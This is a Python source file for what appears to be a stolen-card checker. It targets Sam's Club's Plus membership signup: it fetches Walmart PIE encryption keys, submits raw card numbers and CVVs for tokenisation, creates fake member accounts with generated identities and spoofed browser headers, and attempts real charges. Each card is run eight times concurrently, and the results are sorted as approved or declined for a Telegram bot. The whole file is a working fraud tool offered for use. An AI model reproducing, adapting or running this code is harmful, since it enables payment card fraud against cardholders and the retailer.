"""
Sam's Club Plus Membership Gate API
Professional checker with PIE getkey integration for proper tokenization.
Uses Walmart PIE (Payment Identity Encryption) - fetches fresh key_id from getkey.js.
"""

import httpx
import random
import asyncio
import string
import re
import time
from datetime import datetime, timezone
from typing import Optional, Dict, Any, Tuple

PIE_GETKEY_URL = "https://securedataweb.walmart.com/pie/v1/epay_pie/getkey.js"
SAMS_BASE = "https://www.samsclub.com"


def _parse_pie_getkey(js_text: str) -> Tuple[Optional[str], Optional[str]]:
    """Parse PIE.K and PIE.key_id from getkey.js response."""
    key_id = None
    k_value = None
    # PIE.key_id = "24d8f3fb" or PIE.key_id="24d8f3fb"
    m = re.search(r'PIE\.key_id\s*=\s*["\']([a-f0-9]+)["\']', js_text, re.I)
    if m:
        key_id = m.group(1)
    m = re.search(r'PIE\.K\s*=\s*["\']([A-F0-9]+)["\']', js_text, re.I)
    if m:
        k_value = m.group(1)
    return key_id, k_value


async def fetch_pie_keys(client: httpx.AsyncClient) -> Tuple[Optional[str], Optional[str]]:
    """
    Fetch PIE keys from Walmart getkey.js.
    bust param = current timestamp in ms to avoid cache.
    Returns (key_id, K) or (None, None) on failure.
    """
    bust = int(time.time() * 1000)
    try:
        r = await client.get(
            PIE_GETKEY_URL,
            params={"bust": bust},
            headers={
                "accept": "*/*",
                "accept-language": "en-US,en;q=0.9",
                "referer": "https://www.samsclub.com/",
                "sec-ch-ua": '"Chromium";v="144", "Google Chrome";v="144"',
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": '"Windows"',
                "sec-fetch-dest": "script",
                "sec-fetch-mode": "no-cors",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
            },
            timeout=15,
        )
        if r.status_code == 200 and r.text:
            return _parse_pie_getkey(r.text)
    except Exception:
        pass
    return None, None


class SamsClubChecker:
    BASE_URL = SAMS_BASE

    def __init__(self):
        self.base_cookies = {
            "ACID": "4f7f698b-1c17-427a-a1d8-99e69b6d9118",
            "hasACID": "true",
            "vtc": "d6enzLw7T66uNsOdlc-IhA",
            "locale_ab": "true",
            "adblocked": "false",
            "_pxvid": "3602bc5c-f083-11f0-95e4-1636f1a4dacc",
            "SAT_WPWCNP": "1",
            "az-reg": "scus",
            "SSLB": "0",
            "_xrps": "false",
            "isoLoc": "US_MI",
            "_intlbu": "false",
            "_shcc": "US",
            "assortmentStoreId": "6372",
            "hasLocData": "1",
        }

    @staticmethod
    def generate_string(length: int) -> str:
        return "".join(random.choices(string.ascii_lowercase + string.digits, k=length))

    @staticmethod
    def generate_hex_string(length: int) -> str:
        return "".join(random.choices("0123456789abcdef", k=length))

    @staticmethod
    def generate_user_agent() -> str:
        return "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36"

    @staticmethod
    def get_card_type(cc: str) -> str:
        if len(cc) == 15 and cc[0] == "3":
            return "AMEX"
        if cc[0] == "4":
            return "VISA"
        if cc[0] in ["5", "2"]:
            return "MASTERCARD"
        if cc[0] == "6":
            return "DISCOVER"
        return "VISA"

    def generate_user_data(self, process_id: int) -> Dict[str, str]:
        random_str = self.generate_string(8)
        return {
            "username": f"mass{random_str}",
            "email": f"mass{random_str}@gmail.com",
            "password": f"Mass{self.generate_string(6)}@{random.randint(100, 999)}",
            "firstName": "Mass",
            "lastName": "TH",
            "phone": f"747292{random.randint(1000, 9999)}",
            "address1": "7th Street",
            "address2": "",
            "city": "Los Angeles",
            "state": "CA",
            "zip": "90008",
            "country": "US",
        }

    def get_base_headers(self, user_agent: str) -> Dict[str, str]:
        correlation_id = f"{self.generate_string(4)}{self.generate_string(4)}"
        return {
            "accept": "application/json",
            "accept-language": "en-US",
            "channel": "desktop",
            "content-type": "application/json",
            "consumer-id": "3837085a-b9b8-4b88-80be-670ebb553e4d",
            "consumersourceid": "2",
            "device_profile_ref_id": f"r8xpcbbwazjvs8qk_{self.generate_string(16)}",
            "origin": self.BASE_URL,
            "referer": f"{self.BASE_URL}/join/plus",
            "sams-correlation-id": correlation_id,
            "sec-ch-ua": '"Chromium";v="144", "Google Chrome";v="144"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "tenant-id": "gj9b60",
            "user-agent": user_agent,
            "wm_mp": "true",
            "x-o-bu": "SAMS-US",
            "x-o-correlation-id": correlation_id,
            "x-o-mart": "B2C",
            "x-o-platform": "rweb",
            "x-o-platform-version": "samsus-w-1.2.0-25b2bb49fec4fc0ad5fa38d0da0b26a739c84d77-0121",
            "x-o-segment": "oaoh",
        }

    async def generate_ec_token(
        self,
        client: httpx.AsyncClient,
        cc: str,
        mes: str,
        ano: str,
        cvv: str,
        headers: Dict[str, str],
        key_id: str,
    ) -> Optional[str]:
        """Generate EC token using PIE key_id from getkey.js (fixes tokenization)."""
        try:
            payment_id = f"{self.generate_string(8)}-{self.generate_string(4)}-{self.generate_string(4)}-{self.generate_string(4)}-{self.generate_string(12)}"
            integrity = self.generate_hex_string(16)

            json_data = {
                "payment": {
                    "paymentId": payment_id,
                    "paymentTimestamp": datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ"),
                    "storeType": "ONLINE_CLUB",
                    "transactionSource": {"mode": "BROWSER"},
                    "paymentIdentifiers": [
                        {
                            "identifier": "1",
                            "instrument": {
                                "encryptionData": {
                                    "encryptedCVV": cvv,
                                    "encryptedPan": cc,
                                    "integrityCheck": integrity,
                                    "keyId": key_id,
                                    "phase": "0",
                                    "type": "VOLTAGE",
                                },
                            },
                            "customer": {"customerType": "JOIN"},
                        },
                    ],
                },
            }

            r = await client.post(
                f"{self.BASE_URL}/paymentservices/v2/payment/generateECToken",
                headers=headers,
                json=json_data,
                timeout=30,
            )

            if r.status_code == 200:
                data = r.json()
                payment = data.get("payment", {})
                transactions = payment.get("transactions", [])
                if transactions:
                    instruments = transactions[0].get("instrument", [])
                    if instruments:
                        return instruments[0].get("value")
            return None
        except Exception:
            return None

    async def checkout(
        self,
        client: httpx.AsyncClient,
        cc: str,
        mes: str,
        ano: str,
        cvv: str,
        user_data: Dict[str, str],
        ec_token: Optional[str],
        headers: Dict[str, str],
    ) -> Dict[str, Any]:
        card_type = self.get_card_type(cc)
        checkout_headers = headers.copy()
        checkout_headers.update({
            "channel": "desktop",
            "enable-pax": "1",
            "feature.glassmigration": "true",
            "sams-flow": "Join_Now",
            "sams-tracking-id": headers.get("device_profile_ref_id", ""),
            "wm_tenant_id": "0",
            "wm_vertical_id": "0",
            "x-enable-server-timing": "1",
            "x-latency-trace": "1",
        })

        exp_year = ano if len(ano) == 4 else f"20{ano}"
        json_data = {
            "visitorId": self.base_cookies.get("vtc", "d6enzLw7T66uNsOdlc-IhA"),
            "acquisitionChannel": "Web_Join",
            "clientId": f"cdc1bba2-{self.generate_string(4)}-{self.generate_string(4)}-{self.generate_string(4)}-{self.generate_string(12)}",
            "redirectUrl": f"{self.BASE_URL}/js/b2c-v19/handle-redirect.html",
            "scope": "openid https://prodtitan.onmicrosoft.com/sams-web-api/sc.ns.a https://prodtitan.onmicrosoft.com/sams-web-api/sc.s.r https://prodtitan.onmicrosoft.com/sams-web-api/sc.s.a",
            "contractId": f"pc-{self.generate_string(8)}-{self.generate_string(4)}-{self.generate_string(4)}-{self.generate_string(4)}-{self.generate_string(12)}",
            "enableReJoin": True,
            "enableReclaimEmail": True,
            "subscribeSavingsOffer": True,
            "subscribeShockingValues": False,
            "subscribeSmsMarketing": True,
            "username": user_data["email"],
            "promoLabels": [],
            "overrideAVS": False,
            "isPlusUpsell": False,
            "profile": {
                "email": user_data["email"],
                "password": user_data["password"],
                "channelId": "web",
            },
            "membership": {
                "primaryMembership": {
                    "membership": {
                        "memberRole": "PRIMARY",
                        "membershipTier": "PLUS",
                        "isAutoRenew": True,
                        "autoRenewMethod": "AUTO_RENEW_DOTCOM",
                        "paidStatus": "UNPAID",
                        "promotion": None,
                    },
                    "person": {
                        "memberName": {"firstName": user_data["firstName"], "lastName": user_data["lastName"]},
                        "verifiedAge": 18,
                        "preferredLanguage": "American English",
                        "contact": {
                            "addresses": [
                                {"addressType": "MAILING_ADDRESS", "contactOrder": "Primary", "lineOne": user_data["address1"], "lineTwo": user_data.get("address2", ""), "city": user_data["city"], "stateCode": user_data["state"], "postalCode": user_data["zip"], "countryCode": user_data["country"], "country": "United States", "isOkayToContact": True},
                                {"addressType": "PHYSICAL_ADDRESS", "contactOrder": "Primary", "lineOne": user_data["address1"], "lineTwo": user_data.get("address2", ""), "city": user_data["city"], "stateCode": user_data["state"], "postalCode": user_data["zip"], "countryCode": user_data["country"], "country": "United States", "isOkayToContact": True},
                            ],
                            "emails": [{"type": "HOME_EMAIL", "contactOrder": "Primary", "preferred": True, "emailAddress": user_data["email"]}],
                            "phones": [{"phoneType": "MOBILE", "contactOrder": "Primary", "isOkayToContact": True, "phoneNumber": user_data["phone"]}],
                        },
                    },
                },
            },
            "payments": {
                "giftCards": [],
                "creditCard": {
                    "amountToBeCharged": 120.73,
                    "cardProduct": card_type,
                    "expMonth": mes.zfill(2),
                    "expYear": exp_year,
                    "cardNumber": cc[-4:],
                    "encryptionData": {"type": "VOLTAGE", "token": ec_token},
                    "billingAddress": {
                        "nameOnCard": f'{user_data["firstName"]} {user_data["lastName"]}',
                        "firstName": user_data["firstName"],
                        "lastName": user_data["lastName"],
                        "addressLineOne": user_data["address1"],
                        "addressLineTwo": user_data.get("address2", ""),
                        "city": user_data["city"],
                        "stateCode": user_data["state"],
                        "postalCode": user_data["zip"],
                        "country": "USA",
                        "phoneNumber": user_data["phone"],
                    },
                },
            },
        }

        try:
            r = await client.post(
                f"{self.BASE_URL}/api/vivaldi/cxo/v5/membership-orders",
                headers=checkout_headers,
                json=json_data,
                timeout=30,
            )
            resp_text = r.text
            resp_json = None
            if r.status_code in (200, 400, 401, 403, 404, 500):
                try:
                    resp_json = r.json()
                except Exception:
                    pass
            return {
                "status_code": r.status_code,
                "response": resp_text,
                "response_json": resp_json,
                "success": r.status_code == 200,
            }
        except Exception as e:
            return {"status_code": 0, "response": str(e), "response_json": None, "success": False}

    def _parse_result(self, result: Dict[str, Any], process_id: int) -> str:
        """Parse checkout result into status string."""
        resp_json = result.get("response_json", {})
        resp_text = result.get("response", "")
        status_code = result.get("status_code", 0)

        if result.get("success") or status_code == 200:
            return f"Process {process_id} | ✓✓✓ APPROVED - Membership created successfully! ✓✓✓"

        if resp_json:
            reason_code = resp_json.get("reasonCode", "")
            display_msg = resp_json.get("displayMessage", "")
            error_msg = resp_json.get("message", "")
            result_type = resp_json.get("result", "")

            if reason_code.startswith("A"):
                codes = {
                    "A400": "Card processed (Payment declined by issuer)",
                    "A401": "Card processed (Insufficient funds)",
                    "A402": "Card processed (CVV mismatch)",
                    "A403": "Card processed (Card expired)",
                    "A404": "Card processed (Invalid card number)",
                    "A405": "Card processed (Card restricted/blocked)",
                }
                msg = codes.get(reason_code, display_msg or error_msg)
                return f"Process {process_id} | ✗ DECLINED - {msg}"
            if reason_code.startswith("G"):
                if "tokenization failed" in resp_text.lower():
                    return f"Process {process_id} | ✗ GATEWAY ERROR - Tokenization failed (Card encryption issue)"
                return f"Process {process_id} | ✗ GATEWAY ERROR - {display_msg or error_msg}"
            if reason_code.startswith("V"):
                return f"Process {process_id} | ✗ VALIDATION ERROR - {display_msg or error_msg}"
            if result_type == "DECLINED":
                return f"Process {process_id} | ✗ DECLINED - {display_msg or error_msg}"
            if result_type == "FAILURE":
                return f"Process {process_id} | ✗ FAILED - {display_msg or error_msg}"
            return f"Process {process_id} | ? UNKNOWN - {error_msg or 'See response'}"

        resp_lower = resp_text.lower()
        if "declined" in resp_lower:
            return f"Process {process_id} | ✗ DECLINED - Card declined by issuer"
        if "insufficient" in resp_lower:
            return f"Process {process_id} | ✗ INSUFFICIENT FUNDS"
        if "cvv" in resp_lower or "security code" in resp_lower:
            return f"Process {process_id} | ✗ CVV MISMATCH"
        if "expired" in resp_lower:
            return f"Process {process_id} | ✗ EXPIRED CARD"
        if "invalid" in resp_lower:
            return f"Process {process_id} | ✗ INVALID CARD"
        return f"Process {process_id} | ? UNKNOWN [{status_code}]"

    async def check_card(
        self, card: str, process_id: int, key_id: Optional[str] = None
    ) -> tuple:
        """Single card check. Returns (display_str, raw_result_dict)."""
        try:
            parts = card.split("|")
            if len(parts) != 4:
                return f"Process {process_id}: Invalid card format", {"process_id": process_id, "error": "Invalid format"}

            cc, mes, ano, cvv = map(str.strip, parts)
            user_data = self.generate_user_data(process_id)
            user_agent = self.generate_user_agent()

            async with httpx.AsyncClient(
                timeout=30,
                follow_redirects=True,
                verify=False,
                cookies=self.base_cookies,
            ) as client:
                headers = self.get_base_headers(user_agent)

                if not key_id:
                    key_id, _ = await fetch_pie_keys(client)
                if not key_id:
                    return (
                        f"Process {process_id} | ✗ PIE getkey failed (tokenization unavailable)",
                        {"process_id": process_id, "error": "PIE getkey failed"},
                    )

                ec_token = await self.generate_ec_token(
                    client, cc, mes, ano, cvv, headers, key_id
                )
                if not ec_token:
                    return (
                        f"Process {process_id} | ✗ EC Token generation failed (tokenization error)",
                        {"process_id": process_id, "error": "EC Token failed"},
                    )

                result = await self.checkout(
                    client, cc, mes, ano, cvv, user_data, ec_token, headers
                )

                card_masked = f"{cc[:6]}{'*' * (len(cc) - 10)}{cc[-4:]}"
                status = self._parse_result(result, process_id)
                display = f"{status} | Card: {card_masked}"

                raw = {
                    "process_id": process_id,
                    "status_code": result.get("status_code"),
                    "response_raw": result.get("response", ""),
                    "response_json": result.get("response_json"),
                    "success": result.get("success"),
                }
                return display, raw

        except Exception as e:
            return (
                f"Process {process_id} | ERROR: {str(e)}",
                {"process_id": process_id, "error": str(e)},
            )

    async def run_8_concurrent(self, card: str) -> tuple:
        """Run 8 concurrent checks. Returns (display_results, raw_responses)."""
        async with httpx.AsyncClient(timeout=15, verify=False) as pre_client:
            key_id, _ = await fetch_pie_keys(pre_client)
        if not key_id:
            errs = [f"Process {i}: ✗ PIE getkey failed (tokenization unavailable)" for i in range(1, 9)]
            raws = [{"process_id": i, "error": "PIE getkey failed"} for i in range(1, 9)]
            return errs, raws

        tasks = [self.check_card(card, i + 1, key_id) for i in range(8)]
        gathered = await asyncio.gather(*tasks, return_exceptions=True)

        display_out = []
        raw_out = []
        for r in gathered:
            if isinstance(r, Exception):
                display_out.append(f"ERROR: {r}")
                raw_out.append({"error": str(r)})
            else:
                display_out.append(r[0])
                raw_out.append(r[1])
        return display_out, raw_out


async def async_samsclub_check(card: str) -> dict:
    """
    Run 8 concurrent Sam's Club checks. Returns normalized result for Telegram.
    card format: cc|mm|yyyy|cvv
    Includes raw_responses for debug /yo check complete result button.
    """
    checker = SamsClubChecker()
    results, raw_responses = await checker.run_8_concurrent(card)
    approved = sum(1 for r in results if "APPROVED" in r and "✓✓✓" in r)
    declined = sum(1 for r in results if "DECLINED" in r)
    errors = sum(1 for r in results if "ERROR" in r or "GATEWAY" in r or "Token" in r or "getkey" in r)
    return {
        "results": results,
        "raw_responses": raw_responses,
        "approved_count": approved,
        "declined_count": declined,
        "error_count": errors,
        "total": 8,
        "card": card,
    }
